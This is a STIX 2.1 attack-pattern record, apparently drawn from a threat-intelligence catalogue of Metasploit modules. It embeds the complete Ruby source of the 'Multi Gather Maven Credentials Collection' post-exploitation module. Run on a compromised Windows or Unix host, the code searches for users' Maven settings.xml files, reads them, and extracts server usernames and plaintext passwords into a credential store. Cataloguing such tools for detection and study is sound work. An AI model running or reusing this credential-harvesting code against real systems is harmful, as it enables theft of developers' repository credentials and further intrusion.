{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c336f67f-952e-415e-8167-61dce0eab1a2",
    "created": "2024-08-14T16:33:19.17417Z",
    "modified": "2024-08-14T16:33:19.174174Z",
    "name": "Multi Gather Maven Credentials Collection",
    "description": " This module will collect the contents of all users settings.xml on the targeted machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/maven_creds.rb",
            "external_id": "maven_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Maven Credentials Collection',\n        'Description' => %q{\n          This module will collect the contents of all users settings.xml on the targeted\n          machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['elenoir'],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def gathernix\n    print_status('Unix OS detected')\n    files = cmd_exec('locate settings.xml').split(\"\\n\")\n    # Handle case where locate does not exist (error is returned in first element)\n    if files.length == 1 && !directory?(files.first)\n      files = []\n      paths = enum_user_directories.map { |d| d }\n      if paths.nil? || paths.empty?\n        print_error('No users directory found')\n        return\n      end\n      paths.each do |path|\n        path.chomp!\n        file = 'settings.xml'\n        target = \"#{path}/#{file}\"\n        if file? target\n          files.push(target)\n        end\n      end\n    end\n    return files\n  end\n\n  def gatherwin\n    print_status('Windows OS detected')\n    return cmd_exec('cd\\ && dir settings.xml /b /s').split(\"\\n\")\n  end\n\n  def run\n    print_status('Finding user directories')\n    files = ''\n    case session.platform\n    when 'windows'\n      files = gatherwin\n    when 'unix', 'linux', 'bsd', 'osx'\n      files = gathernix\n    else\n      print_error('Incompatible platform')\n    end\n    if files.nil? || files.empty?\n      print_error('No settings.xml file found')\n      return\n    end\n    download_loot(files)\n  end\n\n  def download_loot(files)\n    print_status(\"Looting #{files.count} files\")\n    files.each do |target|\n      target.chomp!\n      if file? target\n        print_status(\"Downloading #{target}\")\n        extract(target)\n      end\n    end\n  end\n\n  def parse_settings(target, data)\n    xml_doc = Nokogiri::XML(data)\n    xml_doc.remove_namespaces!\n\n    xml_doc.xpath('//server').each do |server|\n      id = server.xpath('id').text\n      username = server.xpath('username').text\n      password = server.xpath('password').text\n\n      print_status('Collected the following credentials:')\n      print_status('    Id: %s' % id)\n      print_status('    Username: %s' % username)\n      print_status('    Password: %s' % password)\n\n      print_status('Try to find url from id...')\n      realm = ''\n\n      xml_doc.xpath(\"//mirror[id = '#{id}']\").each do |mirror|\n        realm = mirror.xpath('url').text\n        print_status(\"Found url in mirror : #{realm}\")\n      end\n\n      if realm.blank?\n        xml_doc.xpath(\"//repository[id = '#{id}']\").each do |repository|\n          realm = repository.xpath('url').text\n          print_status(\"Found url in repository : #{realm}\")\n        end\n      end\n\n      if realm.blank?\n        print_status('No url found, id will be set as realm')\n        realm = id\n      end\n\n      print_line('')\n\n      credential_data = {\n        origin_type: :import,\n        module_fullname: fullname,\n        filename: target,\n        service_name: 'maven',\n        realm_value: realm,\n        realm_key: Metasploit::Model::Realm::Key::WILDCARD,\n        private_type: :password,\n        private_data: password,\n        username: username,\n        workspace_id: myworkspace_id\n      }\n      create_credential(credential_data)\n    end\n  end\n\n  def extract(target)\n    print_status(\"Reading settings.xml file from #{target}\")\n    data = ''\n    if session.type == 'shell'\n      data = session.shell_command(\"cat #{target}\")\n    else\n      settings = session.fs.file.new(target.to_s, 'rb')\n      data << settings.read until settings.eof?\n    end\n\n    parse_settings(target, data)\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}